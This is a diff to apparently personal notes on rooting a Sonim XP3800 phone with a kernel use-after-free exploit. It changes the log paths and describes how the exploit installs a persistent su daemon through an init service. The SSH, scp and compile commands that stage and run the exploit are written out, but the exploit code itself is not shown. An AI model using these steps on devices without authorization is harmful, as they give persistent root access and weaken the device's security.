@@ -25,7 +25,9 @@ scp -P 8022 poc/root-sonim-xp3800/assets/su u0_a50@100.124.251.81:sudaemon
 
 # 2. stage + compile + run the exploit
 cat exploit/le1_root.c | ssh u0_a50@100.124.251.81 -p 8022 'cat > le1_root.c'
-ssh u0_a50@100.124.251.81 -p 8022 'clang -O2 -o le1_root le1_root.c && ./le1_root > /data/local/tmp/le1_root.log 2>&1'
+ssh u0_a50@100.124.251.81 -p 8022 'clang -O2 -o le1_root le1_root.c && ./le1_root > ~/le1_root.log 2>&1'
+# NOTE: log to ~/ (Termux home) — /data/local/tmp is 0771 shell:shell, u0_a50 cannot
+# write it pre-root. After root the exploit can copy the log there itself.
 # on success: /system/bin/sudaemon + /system/xbin/su installed; root survives reboots via init service
 ```
 
@@ -127,9 +129,11 @@ root shell.
 
 ## Next steps
 
-1. Re-run `le1_root.c` on device — redirect to a file for panic-durable logs:
-   `./le1_root > /data/local/tmp/le1_root.log 2>&1`
+1. Re-run `le1_root.c` on device — log to ~/ (NOT /data/local/tmp pre-root):
+   `./le1_root > ~/le1_root.log 2>&1`
 2. Read the log breadcrumb (`[handshake] PARKED`, `firing UAF`, `UAF fired`, `readv returned`)
    — the last line before any freeze/reboot pinpoints the failing stage.
 3. If phase1 leaks a non-kernel pointer → run `leak_debug2.c` (set `minimumLeak=0x200`).
-4. On root: `mount -o rw,remount /system` → copy `su` → `chmod 6755` → permanent root.
+4. On root: the exploit remounts /system itself (auto-detects device, no hardcoded
+   mmcblk0pXX) → installs `/system/bin/sudaemon` + `/system/xbin/su` (0755 daemon
+   model, NOT setuid 6755) → root survives reboots via init service.
